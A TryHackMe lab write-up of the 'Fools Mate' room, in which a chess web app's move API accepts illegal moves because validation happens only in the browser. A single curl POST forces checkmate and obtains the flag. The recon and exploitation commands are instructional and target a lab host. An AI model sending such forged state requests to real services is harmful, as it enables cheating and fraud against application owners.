# Fools Mate - TryHackMe

Web target running an online chess application. The server exposes a JSON API for
submitting moves but never checks that a move is legal, so the game state can be driven
straight to checkmate with a single request. No shell, no privilege escalation: the whole
room is a business logic flaw.

Target: `10.67.141.67`

---

## Reconnaissance

```bash
nmap -sV -sC 10.67.141.67
```

Two open ports: SSH (22) and HTTP (80). The web server hosts a playable chess app, so
everything happens over HTTP.

---

## Enumeration

Making a move in the browser and watching the traffic shows the app talks to a JSON API.
Each move is a POST to `/api/move` carrying the origin and destination squares:

```json
{"from":"e2","to":"e4"}
```

The board in the browser refuses illegal moves, and that is the interesting detail: if
the rules are enforced in the page, the question is whether they are enforced again on
the server.

---

## Vulnerability - Move Validation Only on the Client

Sending a move the browser would never allow answers that question. The API accepts any
`from` and `to` pair and applies it to the board without checking it against the rules of
chess.

The client is the only thing enforcing the game logic, and the client is fully under the
attacker's control.

---

## Exploitation

Instead of playing a real game, submit one illegal move that drops a rook from `a1`
directly onto the black king at `a8`:

```bash
curl -X POST http://10.67.141.67/api/move \
  -H "Content-Type: application/json" \
  -d '{"from":"a1","to":"a8"}'
```

The server accepts it, updates the board, and reports the game as won:

```json
{"ok":true,"move":"a1a8","status":"checkmate","turn":"b","winner":"white"}
```

The same response carries the flag, since reaching checkmate is the win condition the
application rewards.

---

## Key Takeaways

- Client-side validation is a user experience feature, not a security control. If the
  server does not repeat the check, the rules only exist in a page the attacker can edit.
- Any endpoint that accepts state (a move, a quantity, a price, a workflow step) and
  applies it without validating it against the rules of the domain lets an attacker jump
  straight to whatever final state they want.
- This is a business logic flaw, not a technical exploit. No payload, no injection, no
  CVE: just a request the application was never meant to receive, sent anyway.
- When testing an application that holds state, the fastest question to ask is which side
  enforces the rules. Send one request the interface would refuse to send, and the answer
  is immediate.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions
were performed strictly for educational purposes.
